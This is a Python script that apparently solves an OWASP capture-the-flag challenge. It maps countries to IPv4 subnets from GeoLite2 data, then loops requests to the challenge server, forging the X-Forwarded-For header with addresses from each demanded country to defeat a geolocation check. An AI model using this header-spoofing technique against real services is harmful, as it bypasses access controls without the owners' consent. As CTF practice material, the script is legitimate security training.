import requests
import ipaddress
import cPickle as pickle


pickle_db = 'ipv4db.pkl'

ipv4db = {}
try:
    print('reading subnet database')
    with open(pickle_db, 'rb') as pkl:
        ipv4db = pickle.load(pkl)
    print('subnet database loaded')
except:
    print('reading country codes')
    countries = {}
    i = 0
    with open('GeoLite2-Country-CSV_20180807/GeoLite2-Country-Locations-en.csv') as geodb:
        for line in geodb:
            i += 1
            if i == 1:
                continue
            line = line.rstrip('\n')
            fields = line.split(',')
            countries[fields[0]] = fields[5]

    print('found %d items' % i)
    print('reading country subnets')

    i = 0
    with open('GeoLite2-Country-CSV_20180807/GeoLite2-Country-Blocks-IPv4.csv') as ipdb:
        for line in ipdb:
            i += 1
            if i == 1:
                continue
            line = line.rstrip('\n')
            fields = line.split(',')
            geoname_id = fields[1]
            if geoname_id == '':
                #print(line)
                continue
            country = countries[geoname_id]
            if country not in ipv4db:
                ipv4db[country] = []
            ipv4db[country].append(ipaddress.ip_network(unicode(fields[0])))
    print('found %d items' % i)
    print('writing database')
    with open(pickle_db, 'wb') as pkl:
        pickle.dump(ipv4db, pkl)

print('running challange')
s = requests.Session()
url = 'http://challenges.owaspil.ctf.today:8094/'
r = s.get(url, allow_redirects=False)
i=0
prev_country = ''
subnet = 0
address = 0
while i < 1000:
    if 'In order to get the flag you must to serve from' in r.content:
        country = ' '.join(r.content.split('|')[0].split('(')[0].split()[11:])
        print(r.content, country)
        n = 0
        country_name = country
        if country_name not in ipv4db:
            country_name = '"%s"' % country
        if country_name not in ipv4db:
            for c in ipv4db.iterkeys():
                if country in c:
                    country_name = c
                    break
        subnets = ipv4db[country_name]
        if country != prev_country:
            prev_country = country
            subnet = 0
            address = 1
        for ip in subnets[subnet].hosts():
            n += 1
            if n == address:
                address += 1
                break
        subnet += 1
        print(str(ip))
        r = s.get(url, headers={'X-Forwarded-For': str(ip)}, allow_redirects=False)
        i += 1
    else:
        print(r.content)
        break